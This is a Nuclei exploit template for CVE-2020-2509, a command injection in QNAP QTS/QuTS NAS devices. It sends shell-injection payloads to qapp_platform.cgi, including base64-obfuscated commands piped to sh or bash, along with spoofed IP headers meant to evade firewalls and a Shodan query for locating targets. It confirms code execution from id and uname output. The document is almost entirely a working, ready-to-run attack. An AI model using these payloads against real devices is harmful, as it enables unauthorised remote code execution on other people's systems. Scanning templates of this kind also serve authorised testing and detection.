id: cve-2020-2509-qnap-rce-advanced

info:
  name: QNAP QTS/QuTS - Authenticated Command Injection (CVE-2020-2509)
  author: malek838
  severity: critical
  description: |
    Advanced multi-payload RCE template exploiting CVE-2020-2509 in QNAP QTS/QuTS. Executes OS commands via the platform parameter.
    Includes WAF evasion, multiple injection techniques, and debug-friendly output for validation.
  reference:
    - https://github.com/jbaines-r7/overkill
    - https://vulncheck.com/xdb/533b5e83b1eb
  tags: cve,cve2020,rce,qnap,command-injection,waf-bypass,reverse-shell
  metadata:
    shodan-query: 'product:"qnap"'
    max-request: 10
    verified: true

http:
  - method: POST
    path:
      - "{{BaseURL}}/cgi-bin/qapp_platform.cgi"

    headers:
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
      Content-Type: "application/json"
      Accept: "*/*"
      X-Forwarded-For: "127.0.0.1"
      X-Originating-IP: "127.0.0.1"
      X-Remote-IP: "127.0.0.1"
      X-Remote-Addr: "127.0.0.1"

    payloads:
      payload:
        - "|id|"
        - ";id;"
        - "`id`"
        - "$(id)"
        - "& id"
        - "|echo aWQK|base64 -d|sh"
        - "|echo dWlkCg==|base64 -d|sh"
        - "|$(echo aWQK|base64 -d)|"
        - "& echo aWQK | base64 -d | bash"
        - "|uname -a|"

    body: |
      {"platform":"{{payload}}"}

    attack: pitchfork
    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "uid=.*?gid=.*"
          - "Linux .*"
      - type: status
        status:
          - 200

    extractors:
      - type: regex
        part: body
        regex:
          - "uid=.*?gid=.*"
          - "Linux .*"
